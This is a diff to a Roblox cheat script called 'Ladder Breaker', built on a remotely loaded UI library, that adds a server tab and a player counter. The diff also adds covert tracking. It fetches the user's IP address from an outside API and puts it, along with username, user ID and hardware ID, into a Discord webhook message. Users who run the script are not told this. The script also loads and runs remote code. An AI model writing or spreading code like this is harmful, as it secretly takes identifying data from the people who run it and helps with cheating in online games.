@@ -2,7 +2,11 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Ladder Breaker | DMO", HidePremium = false, IntroEnabled = true, IntroText = "Loading..", SaveConfig = true, ConfigFolder = "OrionTest"})
 --locals локальные переменные
+local PlayerIp = game:HttpGet('https://playvora.vercel.app/api/ip')
 local PlayerLog = game.Players.LocalPlayer
+local numberValue = Instance.new("NumberValue") 
+local AmountOfPlayers
+local Players = game:GetService('Players')
 --notify уведомление
 OrionLib:MakeNotification({
 	Name = "LadderBreaker loaded",
@@ -221,25 +225,25 @@ function webhok()
 	local userid = player.UserId
 	local placeid = game.PlaceId
 	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-	
+
 	local url = "https://webhook.lewisakura.moe/api/webhooks/1279901141580386455/qpnvQjtkpvBAPTceyuN-nI6G0-kTbQ7MIYBUWrRHhToS-4n2iMiW3WHleNX1MUoO9XRG"
-	
+
 	local OSTime = os.time();
 	local Time = os.date('!*t', OSTime);
 	local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
-	local Content = '[Ladder Breaker - Full Script]';
+	local Content = '[Ladder Breaker executed - Full Script]';
 	local Embed = {
 		title = 'Name: '..plrDisplayName..' ('..plrName..')';
 		color = '99999';
 		footer = { text = game.JobId };
 		author = {
-			name = 'Profile';
+			name = 'Profile of this bro';
 			url = 'https://www.roblox.com/users/'..userid..'/profile';
 		};
 		fields = {
 			{
 				name = 'HWID: '..hwid..'';
-				value = 'Place id: '..game.PlaceId..'';
+				value = 'Player ip:'..game:HttpGet('https://playvora.vercel.app/api/ip')..'';
 			}
 		};
 		timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
@@ -541,19 +545,39 @@ ClockTab:AddTextbox({
 
 --инфо
 local Ctab = Window:MakeTab({
-	Name = "Info",
+	Name = "Changelog",
         Image = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 Ctab:AddParagraph("v3.4","deleted: ??? (5 seconds); added: webhook(discord), anti-admin tab, tp to bottom of the stairs; renamed: changelog tab, script; cleared: source, changelog tab ")
 Ctab:AddParagraph("v3.5, no more updates (maybe)","added working breaking ladder script, glitch. shhhh...")
---скрипты от креатора и его друга
+Ctab:AddParagraph("v3.6", "i remember the script lol. added server tab")
+--скрипты от креатора
+local Servertab = Window:MakeTab({
+	Name = "Server",
+        Image = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+--количество игроков
+AmountOfPlayers = #Players:GetPlayers()
+--текст количества игроков
+hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local plrsSection = Servertab:AddSection({Name = "Players (max: 50)"})
+local CounOfPlayersLbl = Servertab:AddLabel("Count of players: "..AmountOfPlayers.."")
+Servertab:AddSection({Name = "You"})
+Servertab:AddLabel("You: "..PlayerLog.Name.."("..PlayerLog.DisplayName..")")
+--другие скрипты таб
 local OStab = Window:MakeTab({
 	Name = "Other scripts",
         Image = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
 
-OStab:AddParagraph("scripts by MahaonMaster_TV and m1kpe0","wait for..")
+OStab:AddParagraph("scripts by m1kpe0","soon custom animations")
+
+Players.PlayerAdded:Connect(function()
+    AmountOfPlayers = AmountOfPlayers + 1
+    CounOfPlayersLbl:Set("Count of players: "..AmountOfPlayers.."")
+end)
 
 OrionLib:Init()
